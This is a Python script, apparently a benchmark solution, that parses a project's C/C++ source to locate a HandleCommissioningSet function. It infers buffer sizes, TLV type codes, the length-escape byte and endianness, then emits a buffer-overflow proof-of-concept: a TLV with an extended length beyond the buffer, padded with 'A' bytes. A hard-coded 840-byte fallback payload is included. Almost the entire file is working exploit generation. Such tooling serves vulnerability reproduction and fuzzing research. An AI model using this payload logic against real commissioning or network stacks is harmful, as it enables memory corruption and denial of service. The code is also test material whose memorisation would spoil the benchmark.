import os
import re
import tarfile
import tempfile
import struct
from typing import Dict, Optional, Tuple, List, Set


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)

        handle_path, handle_body = self._find_handle_commissioning_set(root)
        if not handle_body:
            return self._fallback_poc()

        needed_symbols = self._collect_needed_symbols(handle_body)

        const_exprs = self._scan_constant_definitions(root, needed_symbols)
        const_values = self._evaluate_constants(const_exprs)

        endianness = self._detect_endianness(root)
        length_escape = self._detect_length_escape_value(root, const_values)

        arrays = self._extract_local_arrays(handle_body, const_values)
        buf_size, type_value = self._choose_strategy(handle_body, arrays, const_values)

        truncation_likely = self._detect_truncation_patterns(handle_body)

        if buf_size is None:
            buf_size = 840

        if buf_size < 1:
            buf_size = 840

        if truncation_likely and buf_size <= 2048:
            tlv_len = buf_size + 256
        else:
            tlv_len = buf_size + 1

        if tlv_len <= 0:
            tlv_len = 840

        if tlv_len > 0xFFFF:
            tlv_len = 0xFFFF

        if type_value is None:
            type_value = self._choose_tlv_type_from_function(handle_body, const_values)
        if type_value is None:
            type_value = 0x01

        type_value &= 0xFF
        length_escape &= 0xFF

        if endianness == "little":
            len_bytes = struct.pack("<H", tlv_len)
        else:
            len_bytes = struct.pack(">H", tlv_len)

        payload = bytes([type_value, length_escape]) + len_bytes + (b"A" * tlv_len)
        return payload

    def _fallback_poc(self) -> bytes:
        tlv_len = 840
        return bytes([0x01, 0xFF, 0x03, 0x48]) + (b"A" * tlv_len)

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        tmpdir = tempfile.mkdtemp(prefix="arvo_src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.name or m.name.startswith("/") or ".." in m.name.split("/"):
                        continue
                    out_path = os.path.join(tmpdir, m.name)
                    out_path_norm = os.path.normpath(out_path)
                    if not out_path_norm.startswith(os.path.normpath(tmpdir) + os.sep) and out_path_norm != os.path.normpath(tmpdir):
                        continue
                    tf.extract(m, tmpdir)
        except Exception:
            return src_path
        return tmpdir

    def _iter_source_files(self, root: str):
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp"}
        for dirpath, dirnames, filenames in os.walk(root):
            dn = os.path.basename(dirpath)
            if dn in {".git", "build", "out", "bazel-out"}:
                dirnames[:] = []
                continue
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() in exts:
                    yield os.path.join(dirpath, fn)

    def _read_text(self, path: str) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read()
            if len(data) > 5_000_000:
                data = data[:5_000_000]
            return data.decode("utf-8", "ignore")
        except Exception:
            return ""

    def _find_handle_commissioning_set(self, root: str) -> Tuple[Optional[str], Optional[str]]:
        best = (None, None, -1)
        needle = "HandleCommissioningSet"
        for fp in self._iter_source_files(root):
            txt = self._read_text(fp)
            if needle not in txt:
                continue
            idxs = [m.start() for m in re.finditer(re.escape(needle), txt)]
            for idx in idxs:
                body = self._extract_function_body(txt, idx)
                if body:
                    score = len(body)
                    if score > best[2]:
                        best = (fp, body, score)
        return best[0], best[1]

    def _extract_function_body(self, text: str, start_idx: int) -> Optional[str]:
        sig_end = text.find("{", start_idx)
        if sig_end == -1:
            return None
        paren_pos = text.find("(", start_idx, sig_end)
        if paren_pos == -1:
            return None

        i = sig_end
        n = len(text)
        while i < n and text[i] != "{":
            i += 1
        if i >= n or text[i] != "{":
            return None

        brace = 0
        j = i
        while j < n:
            c = text[j]
            if c == "{":
                brace += 1
            elif c == "}":
                brace -= 1
                if brace == 0:
                    return text[i : j + 1]
            elif c == '"':
                j += 1
                while j < n:
                    if text[j] == "\\":
                        j += 2
                        continue
                    if text[j] == '"':
                        break
                    j += 1
            elif c == "'":
                j += 1
                while j < n:
                    if text[j] == "\\":
                        j += 2
                        continue
                    if text[j] == "'":
                        break
                    j += 1
            elif c == "/":
                if j + 1 < n and text[j + 1] == "/":
                    j = text.find("\n", j + 2)
                    if j == -1:
                        return text[i:]
                elif j + 1 < n and text[j + 1] == "*":
                    end = text.find("*/", j + 2)
                    if end == -1:
                        return None
                    j = end + 1
            j += 1
        return None

    def _collect_needed_symbols(self, handle_body: str) -> Set[str]:
        symbols: Set[str] = set()

        for m in re.finditer(r"\[\s*([^\]]+)\s*\]", handle_body):
            expr = m.group(1).strip()
            for name in re.findall(r"\b[A-Za-z_]\w*\b", expr):
                if name in {"sizeof", "static_cast", "reinterpret_cast", "const_cast", "true", "false"}:
                    continue
                symbols.add(name)

        for m in re.finditer(r"\bcase\s+([^:]+)\s*:", handle_body):
            label = m.group(1).strip()
            if label:
                parts = [p.strip() for p in re.split(r"\s*\|\s*|\s*\+\s*", label) if p.strip()]
                for p in parts:
                    if "k" in p:
                        for name in re.findall(r"\b[A-Za-z_]\w*\b", p):
                            if name.startswith("k") or name.isupper():
                                symbols.add(name)
                                if "::" in p:
                                    symbols.add(p.split("::")[-1])

        for s in ["kLengthEscape", "kEscapeLength", "kExtendedLength", "kLengthExtended", "kMaxSize", "kMaxLength", "kMaxCommissioningDataLength"]:
            symbols.add(s)

        return symbols

    def _scan_constant_definitions(self, root: str, needed: Set[str]) -> Dict[str, str]:
        if not needed:
            return {}

        key_re = re.compile(r"\b(" + "|".join(re.escape(k) for k in sorted(needed, key=len, reverse=True)) + r")\b")
        exprs: Dict[str, str] = {}

        for fp in self._iter_source_files(root):
            txt = self._read_text(fp)
            if not txt:
                continue
            if not key_re.search(txt):
                continue

            for m in re.finditer(r"^[ \t]*#define[ \t]+([A-Za-z_]\w*)[ \t]+(.+)$", txt, flags=re.M):
                name = m.group(1)
                if name not in needed or "(" in name:
                    continue
                val = m.group(2).strip()
                val = val.split("//", 1)[0].strip()
                val = val.split("/*", 1)[0].strip()
                if val:
                    exprs.setdefault(name, val)

            for m in re.finditer(r"\b(?:static\s+)?(?:constexpr|const)\s+[^;=\n]*\b([A-Za-z_]\w*)\s*=\s*([^;]+);", txt):
                name = m.group(1)
                if name not in needed:
                    continue
                val = m.group(2).strip()
                if val:
                    exprs.setdefault(name, val)

            for name in needed:
                if name in exprs:
                    continue
                mm = re.search(r"\b" + re.escape(name) + r"\s*=\s*([^,\n}]+)", txt)
                if mm:
                    val = mm.group(1).strip()
                    if val:
                        exprs.setdefault(name, val)

        exprs.setdefault("UINT8_MAX", "255")
        exprs.setdefault("UINT16_MAX", "65535")
        exprs.setdefault("UINT32_MAX", "4294967295")
        return exprs

    def _normalize_expr(self, expr: str) -> Optional[str]:
        if not expr:
            return None
        expr = expr.strip()

        expr = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\bconst_cast\s*<[^>]+>\s*\(", "(", expr)

        if "sizeof" in expr:
            return None

        expr = expr.split("//", 1)[0].strip()
        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S).strip()

        expr = re.sub(r"(?i)\b(0x[0-9a-f]+|\d+)\s*([uUlL]+)\b", r"\1", expr)
        expr = expr.replace("true", "1").replace("false", "0")
        expr = expr.strip()
        if not expr:
            return None
        return expr

    def _safe_eval(self, expr: str, values: Dict[str, int]) -> Optional[int]:
        expr_n = self._normalize_expr(expr)
        if expr_n is None:
            return None

        def repl_name(m):
            name = m.group(0)
            if name in values:
                return str(values[name])
            return name

        expr_n = re.sub(r"\b[A-Za-z_]\w*\b", repl_name, expr_n)

        if re.search(r"\b[A-Za-z_]\w*\b", expr_n):
            return None

        if re.search(r"[^0-9xXa-fA-F\+\-\*\/\%\(\)\<\>\&\|\^\~\s]", expr_n):
            return None

        expr_n = expr_n.replace("/", "//")

        try:
            val = eval(expr_n, {"__builtins__": None}, {})
            if isinstance(val, bool):
                return int(val)
            if isinstance(val, int):
                return val
            return None
        except Exception:
            return None

    def _evaluate_constants(self, exprs: Dict[str, str]) -> Dict[str, int]:
        values: Dict[str, int] = {}
        for k in ["UINT8_MAX", "UINT16_MAX", "UINT32_MAX"]:
            if k in exprs:
                v = self._safe_eval(exprs[k], values)
                if v is not None:
                    values[k] = v

        for _ in range(20):
            changed = False
            for name, expr in exprs.items():
                if name in values:
                    continue
                v = self._safe_eval(expr, values)
                if v is not None:
                    values[name] = v
                    changed = True
            if not changed:
                break
        return values

    def _extract_local_arrays(self, handle_body: str, const_values: Dict[str, int]) -> Dict[str, int]:
        arrays: Dict[str, int] = {}

        decl_re = re.compile(
            r"\b(?:uint8_t|char|int8_t|unsigned\s+char)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]\s*;"
        )
        for m in decl_re.finditer(handle_body):
            name = m.group(1)
            expr = m.group(2).strip()
            size = self._safe_eval(expr, const_values)
            if size is not None and 0 < size <= 1_000_000:
                arrays[name] = int(size)

        return arrays

    def _detect_truncation_patterns(self, handle_body: str) -> bool:
        if re.search(r"\buint8_t\s+\w+\s*=\s*[\w:]*\w+\.GetLength\s*\(\s*\)\s*;", handle_body):
            return True
        if "static_cast<uint8_t>" in handle_body and ".GetLength()" in handle_body:
            return True
        if re.search(r"\buint8_t\s+\w+\s*=\s*.*GetSize\s*\(\s*\)\s*;", handle_body):
            return True
        return False

    def _choose_strategy(self, handle_body: str, arrays: Dict[str, int], const_values: Dict[str, int]) -> Tuple[Optional[int], Optional[int]]:
        memcpy_re = re.compile(r"\bmemcpy\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,\s*([^)]+)\)")
        candidates: List[Tuple[int, Optional[int]]] = []

        for m in memcpy_re.finditer(handle_body):
            dest = m.group(1).strip()
            length_expr = m.group(3)
            if ".GetLength" not in length_expr and ".GetSize" not in length_expr and "GetLength" not in length_expr and "GetSize" not in length_expr:
                continue

            base = self._dest_base_identifier(dest)
            if base and base in arrays:
                size = arrays[base]
                type_val = self._infer_case_type_near(handle_body, m.start(), const_values)
                candidates.append((size, type_val))

        if candidates:
            max_buf = max(s for s, _ in candidates)
            type_val = None
            for s, tv in candidates:
                if s == max_buf and tv is not None:
                    type_val = tv
                    break
            return max_buf, type_val

        if arrays:
            weighted = []
            for name, size in arrays.items():
                w = 0
                ln = name.lower()
                if "commission" in ln:
                    w += 3
                if "dataset" in ln:
                    w += 2
                if "data" in ln:
                    w += 1
                weighted.append((w, size, name))
            weighted.sort(reverse=True)
            _, size, _ = weighted[0]
            return size, None

        return None, None

    def _dest_base_identifier(self, dest: str) -> Optional[str]:
        dest = dest.strip()
        dest = dest.lstrip("&*(").strip()
        m = re.match(r"([A-Za-z_]\w*)", dest)
        if m:
            return m.group(1)
        return None

    def _infer_case_type_near(self, handle_body: str, pos: int, const_values: Dict[str, int]) -> Optional[int]:
        window_start = max(0, pos - 800)
        chunk = handle_body[window_start:pos]
        matches = list(re.finditer(r"\bcase\s+([^:]+)\s*:", chunk))
        if not matches:
            return None
        label = matches[-1].group(1).strip()
        if not label:
            return None
        if re.fullmatch(r"0x[0-9A-Fa-f]+|\d+", label):
            try:
                return int(label, 0) & 0xFF
            except Exception:
                return None
        parts = label.split("::")
        last = parts[-1].strip()
        if last in const_values:
            return const_values[last] & 0xFF
        if label in const_values:
            return const_values[label] & 0xFF
        m = re.search(r"\b([A-Za-z_]\w*)\b", last)
        if m:
            nm = m.group(1)
            if nm in const_values:
                return const_values[nm] & 0xFF
        return None

    def _choose_tlv_type_from_function(self, handle_body: str, const_values: Dict[str, int]) -> Optional[int]:
        constants = set()
        for m in re.finditer(r"\bcase\s+([^:]+)\s*:", handle_body):
            label = m.group(1).strip()
            if not label:
                continue
            if re.fullmatch(r"0x[0-9A-Fa-f]+|\d+", label):
                try:
                    v = int(label, 0) & 0xFF
                    constants.add(v)
                except Exception:
                    pass
            else:
                last = label.split("::")[-1].strip()
                if last in const_values:
                    constants.add(const_values[last] & 0xFF)

        name_hits: List[Tuple[int, int]] = []
        preferred = [
            ("CommissionerId", 100),
            ("SteeringData", 90),
            ("Joiner", 80),
            ("BorderAgent", 70),
            ("UdpPort", 60),
            ("Session", 50),
        ]
        for m in re.finditer(r"\b(case\s+([^:]+)\s*:)", handle_body):
            label = m.group(2).strip()
            last = label.split("::")[-1]
            score = 0
            for kw, w in preferred:
                if kw in last:
                    score = max(score, w)
            v = None
            if re.fullmatch(r"0x[0-9A-Fa-f]+|\d+", label):
                try:
                    v = int(label, 0) & 0xFF
                except Exception:
                    v = None
            else:
                last2 = label.split("::")[-1].strip()
                if last2 in const_values:
                    v = const_values[last2] & 0xFF
            if v is not None:
                name_hits.append((score, v))

        if name_hits:
            name_hits.sort(reverse=True)
            return name_hits[0][1]

        if constants:
            return min(constants)
        return None

    def _detect_endianness(self, root: str) -> str:
        # Default big-endian; attempt to detect explicit little-endian usage for TLV length.
        big_hits = 0
        little_hits = 0
        patterns = [
            "BigEndian::ReadUint16",
            "Encoding::BigEndian::ReadUint16",
            "LittleEndian::ReadUint16",
            "Encoding::LittleEndian::ReadUint16",
        ]
        for fp in self._iter_source_files(root):
            txt = self._read_text(fp)
            if not txt:
                continue
            if "GetLength" in txt and ("Tlv" in txt or "tlv" in txt):
                if patterns[0] in txt or patterns[1] in txt:
                    big_hits += 1
                if patterns[2] in txt or patterns[3] in txt:
                    little_hits += 1
        if little_hits > big_hits and little_hits > 0:
            return "little"
        return "big"

    def _detect_length_escape_value(self, root: str, const_values: Dict[str, int]) -> int:
        for key in ["kLengthEscape", "kEscapeLength", "kExtendedLength", "kLengthExtended"]:
            if key in const_values:
                v = const_values[key]
                if 0 <= v <= 255:
                    return int(v)
        return 0xFF